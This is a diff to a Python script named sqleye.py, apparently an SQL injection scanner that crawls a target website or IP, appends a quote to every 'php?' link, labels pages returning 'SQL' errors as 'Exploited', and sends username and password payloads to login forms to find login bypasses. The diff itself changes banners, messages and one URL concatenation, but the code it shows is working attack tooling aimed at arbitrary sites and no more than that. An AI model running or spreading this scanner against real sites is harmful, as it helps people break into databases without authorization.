@@ -1,21 +1,21 @@
-#python3.9
+#Python3.9
 import requests 
 from bs4 import BeautifulSoup
 from lxml import html, etree
 import sys, fnmatch
 import re
 #use ./sqleye.py website (or ip)
-#will add multi threading and reading from a list of servers
-### v3 
 ### add user agent sqli and check all textbox vectors 
 def presentation():
 
-    print("[+] # #############################################")
-    print("[+] #                                             #")
-    print("[+] #          eye spy with my little eye a sqli  #")
-    print("[+] #      ~00xZ-       github.com/00xZ           #")
-    print("[+] #                                             #")
-    print("[+] # #############################################")
+    print(" # #############################################")
+    print(" #                                             #")
+    print(" #          eye spy with my little eye a sqli  #")
+    print(" #                                             #")
+    print(" #      ~00xZ-       github.com/00xZ           #")
+    print(" #                 -version 1.7                #")
+    print(" #                                             #")
+    print(" # #############################################")
 
 def gethref(url):
     headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
@@ -26,7 +26,7 @@ def gethref(url):
         soup = BeautifulSoup(req.text, 'html.parser')
         for link in soup.select('a[href*="php?"]'):
             okay = (link["href"])
-            serv = (ur + okay + "'")
+            serv = (okay + "'")
             fo1 = open("maybeSQLi.txt", "a+")
             fo1.write(serv + "\n")
             fo1.close
@@ -34,20 +34,20 @@ def gethref(url):
             reeqee = requests.get(serv, timeout=6, headers=headers)
             souper = BeautifulSoup(reeqee.text, "html.parser")
             if souper(text=lambda t: "SQL" in t):
-                print(serv + " :  [!] VULN [!]")
+                print("\n [!] " + serv + " :  [!] Exploited [!] \n")
                 fo = open("vulnSQLi.txt", "a+")
                 fo.write(serv + "\n")
                 fo.close
             else:
                 print("[x] Found SQLi Input but not exploitible [x] : " + serv )
-                pass
+                pass 
     except:
-        print("[!] Timed Out: " + ur)
+        print("[!] Timed out after timeout check maybe change timeout in script: " + ur)
 
 
 
 def try_connect(url, USERS, PASSWORDS, title):
-	print("trying")
+	#print("trying")
 	headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
 	try:
 		payload = {
@@ -63,10 +63,10 @@ def try_connect(url, USERS, PASSWORDS, title):
 		if titlenew != '<title>' + title + '</title>':
 			print(serv + " :  [!] LOGIN SQLI : VULN [!] " )
 		else:
-			print("not vuln")
+			print("[X] No User Input SQLi [X]")
 			pass
 	except:
-		print("idk")
+		print("\n")
 		gethref(url)
 		
 		
@@ -191,14 +191,14 @@ def whatitbe(ip):
 		reqeer = requests.post(url, timeout=7, headers=headers)
 		title(url)
 	except:
-		#print("Going for https...")
+		print("  [!] Site Timed Out- "+url+" [!] ")
 		pass
 	try:
 		url = ("https://" +ip+ "/")
 		reqeer = requests.post(url, timeout=7, headers=headers)
 		title(url)
 	except:
-		print("  [!] Site Timed Out- "+ip+" [!] ")
+		print("  [!] Site Timed Out- "+url+" [!] ")
 		pass
 def main():
 	presentation()
